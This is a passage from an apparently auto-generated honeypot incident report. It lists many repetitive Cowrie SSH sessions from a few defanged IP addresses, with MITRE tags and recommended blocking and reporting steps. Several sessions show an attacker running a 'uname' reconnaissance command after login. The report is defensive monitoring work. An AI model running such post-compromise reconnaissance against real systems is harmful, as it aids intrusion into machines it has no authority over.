| `2026-06-25 14:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5310da579bd2

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 14:10 |
| **Last Seen** | 2026-06-25 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:10:44` | `cowrie.session.connect` |
| `2026-06-25 14:10:44` | `cowrie.client.version` |
| `2026-06-25 14:10:44` | `cowrie.client.kex` |
| `2026-06-25 14:10:44` | `cowrie.login.success` |
| `2026-06-25 14:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d79366c8832d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 14:10 |
| **Last Seen** | 2026-06-25 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:10:44` | `cowrie.session.connect` |
| `2026-06-25 14:10:44` | `cowrie.client.version` |
| `2026-06-25 14:10:44` | `cowrie.client.kex` |
| `2026-06-25 14:10:44` | `cowrie.login.success` |
| `2026-06-25 14:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b04bade6a615

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 14:10 |
| **Last Seen** | 2026-06-25 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:10:46` | `cowrie.session.connect` |
| `2026-06-25 14:10:46` | `cowrie.client.version` |
| `2026-06-25 14:10:46` | `cowrie.client.kex` |
| `2026-06-25 14:10:46` | `cowrie.login.success` |
| `2026-06-25 14:10:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91198ed755eb

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 14:10 |
| **Last Seen** | 2026-06-25 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:10:46` | `cowrie.session.connect` |
| `2026-06-25 14:10:46` | `cowrie.client.version` |
| `2026-06-25 14:10:46` | `cowrie.client.kex` |
| `2026-06-25 14:10:46` | `cowrie.login.success` |
| `2026-06-25 14:10:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15328be1b658

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:11 |
| **Last Seen** | 2026-06-25 14:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:11:02` | `cowrie.session.connect` |
| `2026-06-25 14:11:02` | `cowrie.client.version` |
| `2026-06-25 14:11:02` | `cowrie.client.kex` |
| `2026-06-25 14:11:02` | `cowrie.login.success` |
| `2026-06-25 14:11:03` | `cowrie.session.params` |
| `2026-06-25 14:11:03` | `cowrie.command.input` |
| `2026-06-25 14:11:03` | `cowrie.log.closed` |
| `2026-06-25 14:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fa0409eae61

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:11 |
| **Last Seen** | 2026-06-25 14:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:11:48` | `cowrie.session.connect` |
| `2026-06-25 14:11:48` | `cowrie.client.version` |
| `2026-06-25 14:11:48` | `cowrie.client.kex` |
| `2026-06-25 14:11:49` | `cowrie.login.success` |
| `2026-06-25 14:11:50` | `cowrie.session.params` |
| `2026-06-25 14:11:50` | `cowrie.command.input` |
| `2026-06-25 14:11:50` | `cowrie.log.closed` |
| `2026-06-25 14:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-292864378b77

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:12 |
| **Last Seen** | 2026-06-25 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:12:35` | `cowrie.session.connect` |
| `2026-06-25 14:12:35` | `cowrie.client.version` |
| `2026-06-25 14:12:35` | `cowrie.client.kex` |
| `2026-06-25 14:12:35` | `cowrie.login.success` |
| `2026-06-25 14:12:36` | `cowrie.session.params` |
| `2026-06-25 14:12:36` | `cowrie.command.input` |
| `2026-06-25 14:12:36` | `cowrie.log.closed` |
| `2026-06-25 14:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a62cbcb47917

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:13 |
| **Last Seen** | 2026-06-25 14:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:13:21` | `cowrie.session.connect` |
| `2026-06-25 14:13:21` | `cowrie.client.version` |
| `2026-06-25 14:13:21` | `cowrie.client.kex` |
| `2026-06-25 14:13:21` | `cowrie.login.success` |
| `2026-06-25 14:13:22` | `cowrie.session.params` |
| `2026-06-25 14:13:22` | `cowrie.command.input` |
| `2026-06-25 14:13:22` | `cowrie.log.closed` |
| `2026-06-25 14:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40a925a48149

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:14 |
| **Last Seen** | 2026-06-25 14:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:14:12` | `cowrie.session.connect` |
| `2026-06-25 14:14:12` | `cowrie.client.version` |
| `2026-06-25 14:14:12` | `cowrie.client.kex` |
| `2026-06-25 14:14:12` | `cowrie.login.success` |
| `2026-06-25 14:14:13` | `cowrie.session.params` |
| `2026-06-25 14:14:13` | `cowrie.command.input` |
| `2026-06-25 14:14:13` | `cowrie.log.closed` |
| `2026-06-25 14:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98e8d60fb012

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:15 |
| **Last Seen** | 2026-06-25 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:15:00` | `cowrie.session.connect` |
| `2026-06-25 14:15:00` | `cowrie.client.version` |
| `2026-06-25 14:15:00` | `cowrie.client.kex` |
| `2026-06-25 14:15:01` | `cowrie.login.success` |
| `2026-06-25 14:15:01` | `cowrie.session.params` |
| `2026-06-25 14:15:01` | `cowrie.command.input` |
| `2026-06-25 14:15:02` | `cowrie.log.closed` |
| `2026-06-25 14:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36ee63e2d74a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:15 |
| **Last Seen** | 2026-06-25 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:15:49` | `cowrie.session.connect` |
| `2026-06-25 14:15:49` | `cowrie.client.version` |
| `2026-06-25 14:15:49` | `cowrie.client.kex` |
| `2026-06-25 14:15:50` | `cowrie.login.success` |
| `2026-06-25 14:15:51` | `cowrie.session.params` |
| `2026-06-25 14:15:51` | `cowrie.command.input` |
| `2026-06-25 14:15:51` | `cowrie.log.closed` |
| `2026-06-25 14:15:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80104fb8b9b4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:16 |
| **Last Seen** | 2026-06-25 14:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:16:40` | `cowrie.session.connect` |
| `2026-06-25 14:16:40` | `cowrie.client.version` |
| `2026-06-25 14:16:40` | `cowrie.client.kex` |
| `2026-06-25 14:16:40` | `cowrie.login.success` |
| `2026-06-25 14:16:41` | `cowrie.session.params` |
| `2026-06-25 14:16:41` | `cowrie.command.input` |
| `2026-06-25 14:16:41` | `cowrie.log.closed` |
| `2026-06-25 14:16:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10d24f2171a7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:17 |
| **Last Seen** | 2026-06-25 14:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:17:29` | `cowrie.session.connect` |
| `2026-06-25 14:17:29` | `cowrie.client.version` |
| `2026-06-25 14:17:29` | `cowrie.client.kex` |
| `2026-06-25 14:17:30` | `cowrie.login.success` |
| `2026-06-25 14:17:30` | `cowrie.session.params` |
| `2026-06-25 14:17:30` | `cowrie.command.input` |
| `2026-06-25 14:17:30` | `cowrie.log.closed` |
| `2026-06-25 14:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ec16ccdcbc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:18 |
| **Last Seen** | 2026-06-25 14:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:18:21` | `cowrie.session.connect` |
| `2026-06-25 14:18:21` | `cowrie.client.version` |
| `2026-06-25 14:18:21` | `cowrie.client.kex` |
| `2026-06-25 14:18:21` | `cowrie.login.success` |
| `2026-06-25 14:18:22` | `cowrie.session.params` |
| `2026-06-25 14:18:22` | `cowrie.command.input` |
| `2026-06-25 14:18:22` | `cowrie.log.closed` |
| `2026-06-25 14:18:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-214777ad798d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:19 |
| **Last Seen** | 2026-06-25 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:19:08` | `cowrie.session.connect` |
| `2026-06-25 14:19:08` | `cowrie.client.version` |
| `2026-06-25 14:19:08` | `cowrie.client.kex` |
| `2026-06-25 14:19:09` | `cowrie.login.success` |
| `2026-06-25 14:19:09` | `cowrie.session.params` |
| `2026-06-25 14:19:09` | `cowrie.command.input` |
| `2026-06-25 14:19:09` | `cowrie.log.closed` |
| `2026-06-25 14:19:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a933f7a405

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:19 |
| **Last Seen** | 2026-06-25 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:19:58` | `cowrie.session.connect` |
| `2026-06-25 14:19:58` | `cowrie.client.version` |
| `2026-06-25 14:19:58` | `cowrie.client.kex` |
| `2026-06-25 14:19:58` | `cowrie.login.success` |
| `2026-06-25 14:19:59` | `cowrie.session.params` |
| `2026-06-25 14:19:59` | `cowrie.command.input` |
| `2026-06-25 14:19:59` | `cowrie.log.closed` |
| `2026-06-25 14:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b50f1c7eb469

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:20 |
| **Last Seen** | 2026-06-25 14:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:20:45` | `cowrie.session.connect` |
| `2026-06-25 14:20:45` | `cowrie.client.version` |
| `2026-06-25 14:20:45` | `cowrie.client.kex` |
| `2026-06-25 14:20:45` | `cowrie.login.success` |
| `2026-06-25 14:20:46` | `cowrie.session.params` |
| `2026-06-25 14:20:46` | `cowrie.command.input` |
| `2026-06-25 14:20:46` | `cowrie.log.closed` |
| `2026-06-25 14:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e712c902fd05

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:21 |
| **Last Seen** | 2026-06-25 14:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:21:33` | `cowrie.session.connect` |
| `2026-06-25 14:21:33` | `cowrie.client.version` |
| `2026-06-25 14:21:33` | `cowrie.client.kex` |
| `2026-06-25 14:21:33` | `cowrie.login.success` |
| `2026-06-25 14:21:34` | `cowrie.session.params` |
| `2026-06-25 14:21:34` | `cowrie.command.input` |
| `2026-06-25 14:21:34` | `cowrie.log.closed` |
| `2026-06-25 14:21:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8291f57aea22

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:22 |
| **Last Seen** | 2026-06-25 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:22:20` | `cowrie.session.connect` |
| `2026-06-25 14:22:20` | `cowrie.client.version` |
| `2026-06-25 14:22:20` | `cowrie.client.kex` |
| `2026-06-25 14:22:20` | `cowrie.login.success` |
| `2026-06-25 14:22:21` | `cowrie.session.params` |
| `2026-06-25 14:22:21` | `cowrie.command.input` |
| `2026-06-25 14:22:21` | `cowrie.log.closed` |
| `2026-06-25 14:22:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e322dbd0d666

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:23 |
| **Last Seen** | 2026-06-25 14:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:23:06` | `cowrie.session.connect` |
| `2026-06-25 14:23:06` | `cowrie.client.version` |
| `2026-06-25 14:23:06` | `cowrie.client.kex` |
| `2026-06-25 14:23:07` | `cowrie.login.success` |
| `2026-06-25 14:23:07` | `cowrie.session.params` |
| `2026-06-25 14:23:07` | `cowrie.command.input` |
| `2026-06-25 14:23:08` | `cowrie.log.closed` |
| `2026-06-25 14:23:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-935ffff32603

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:23 |
| **Last Seen** | 2026-06-25 14:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:23:53` | `cowrie.session.connect` |
| `2026-06-25 14:23:53` | `cowrie.client.version` |
| `2026-06-25 14:23:53` | `cowrie.client.kex` |
| `2026-06-25 14:23:54` | `cowrie.login.success` |
| `2026-06-25 14:23:54` | `cowrie.session.params` |
| `2026-06-25 14:23:54` | `cowrie.command.input` |
| `2026-06-25 14:23:54` | `cowrie.log.closed` |
| `2026-06-25 14:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f3c78788715

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-25 14:24 |
| **Last Seen** | 2026-06-25 14:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:24:18` | `cowrie.session.connect` |
| `2026-06-25 14:24:18` | `cowrie.client.version` |
| `2026-06-25 14:24:19` | `cowrie.client.kex` |
| `2026-06-25 14:24:20` | `cowrie.login.success` |
| `2026-06-25 14:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d69a97f5781

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-06-25 14:24 |
| **Last Seen** | 2026-06-25 14:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:24:19` | `cowrie.session.connect` |
| `2026-06-25 14:24:19` | `cowrie.client.version` |
| `2026-06-25 14:24:19` | `cowrie.client.kex` |
| `2026-06-25 14:24:20` | `cowrie.login.success` |
| `2026-06-25 14:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-488138b21326

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:24 |
| **Last Seen** | 2026-06-25 14:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:24:40` | `cowrie.session.connect` |
| `2026-06-25 14:24:40` | `cowrie.client.version` |
| `2026-06-25 14:24:40` | `cowrie.client.kex` |
| `2026-06-25 14:24:41` | `cowrie.login.success` |
| `2026-06-25 14:24:42` | `cowrie.session.params` |
| `2026-06-25 14:24:42` | `cowrie.command.input` |
| `2026-06-25 14:24:42` | `cowrie.log.closed` |
| `2026-06-25 14:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c061b262e20

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:25 |
| **Last Seen** | 2026-06-25 14:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:25:30` | `cowrie.session.connect` |
| `2026-06-25 14:25:30` | `cowrie.client.version` |
| `2026-06-25 14:25:30` | `cowrie.client.kex` |
| `2026-06-25 14:25:31` | `cowrie.login.success` |
| `2026-06-25 14:25:32` | `cowrie.session.params` |
| `2026-06-25 14:25:32` | `cowrie.command.input` |
| `2026-06-25 14:25:32` | `cowrie.log.closed` |
| `2026-06-25 14:25:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e4c49fc9dcd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:26 |
| **Last Seen** | 2026-06-25 14:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:26:19` | `cowrie.session.connect` |
| `2026-06-25 14:26:19` | `cowrie.client.version` |
| `2026-06-25 14:26:19` | `cowrie.client.kex` |
| `2026-06-25 14:26:19` | `cowrie.login.success` |
| `2026-06-25 14:26:20` | `cowrie.session.params` |
| `2026-06-25 14:26:20` | `cowrie.command.input` |
| `2026-06-25 14:26:20` | `cowrie.log.closed` |
| `2026-06-25 14:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f1f160804b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:27 |
| **Last Seen** | 2026-06-25 14:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:27:15` | `cowrie.session.connect` |
| `2026-06-25 14:27:15` | `cowrie.client.version` |
| `2026-06-25 14:27:15` | `cowrie.client.kex` |
| `2026-06-25 14:27:15` | `cowrie.login.success` |
| `2026-06-25 14:27:16` | `cowrie.session.params` |
| `2026-06-25 14:27:16` | `cowrie.command.input` |
| `2026-06-25 14:27:16` | `cowrie.log.closed` |
